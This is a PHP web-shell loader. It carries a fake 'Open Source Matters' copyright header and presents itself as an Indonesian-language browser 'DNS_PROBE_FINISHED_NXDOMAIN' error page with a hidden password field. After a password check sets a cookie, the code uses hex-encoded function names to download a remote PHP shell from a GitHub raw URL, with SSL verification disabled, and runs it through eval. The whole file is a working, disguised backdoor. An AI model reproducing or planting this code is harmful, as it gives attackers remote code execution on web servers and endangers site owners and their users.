<?php
/**
 * @package    Haxor.Group
 * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
 *
 */

// @deprecated  1.0  Deprecated without replacement
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'LPH'; 
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e', // fo p en => 0
        '73747265616d5f6765745f636f6e74656e7473', // strea m_get_contents => 1
        '66696c655f6765745f636f6e74656e7473', // fil e_g et_cont ents => 2
        '6375726c5f65786563' // cur l_ex ec => 3
    );

    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function geturlsinfo($destiny) {
        $belief = array(
            hex2str($GLOBALS['Array'][0]), 
            hex2str($GLOBALS['Array'][1]), 
            hex2str($GLOBALS['Array'][2]), 
            hex2str($GLOBALS['Array'][3])  
        );

        if (function_exists($belief[3])) { 
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($belief[2])) { 
            return $belief[2]($destiny);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
            $purpose = $belief[0]($destiny, "r");
            $love = $belief[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    $destiny = 'https://raw.githubusercontent.com/twololbrother/shell/refs/heads/main/pemuda.php';
    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream);
    }
} 
else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$qBCKSYqZa4aDGuZgDWBMSesJ/X8jvNGtD.lSw52F5S.uAUXHSowjW'; // https://bcrypt.online/
        
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'LPH', time() + 3600, '/'); 
            header("Location: " . $_SERVER['PHP_SELF']); 
            exit();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Password Tersembunyi</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
        }

        /* Kontainer utama */
        .container {
            text-align: center;
        }

        .icon {
            font-size: 80px;
            color: #9E9E9E;
        }

        h1 {
            font-size: 24px;
            color: #333;
        }

        p {
            color: #666;
        }

        /* Tombol reload */
        .button {
            display: inline-block;
            background-color: #4285F4;
            color: white;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }

        .button:hover {
            background-color: #357AE8;
        }

        /* Styling kolom password */
        .password-input {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            width: 200px; /* Lebar kolom password */
            font-size: 16px;
        }
    </style>
</head>
<body>

    <!-- Konten utama -->
    <div class="container">
        <div class="icon">☹</div>
        <h1>Situs ini tidak dapat dijangkau</h1>
        <p>Periksa apakah ada kesalahan ketik di sini.</p>
        <p>Jika pengejaan benar, coba jalankan Diagnostik Jaringan Windows.</p>
        <p><i>DNS_PROBE_FINISHED_NXDOMAIN</i></p>
        
        <!-- Form untuk kolom password -->
        <form method="POST" action="">
            <input type="password" id="password" name="password" class="password-input" placeholder="Masukkan password" required>
            <div class="button" onclick="document.forms[0].submit()">Access</div>
        </form>
    </div>

</body>
</html>
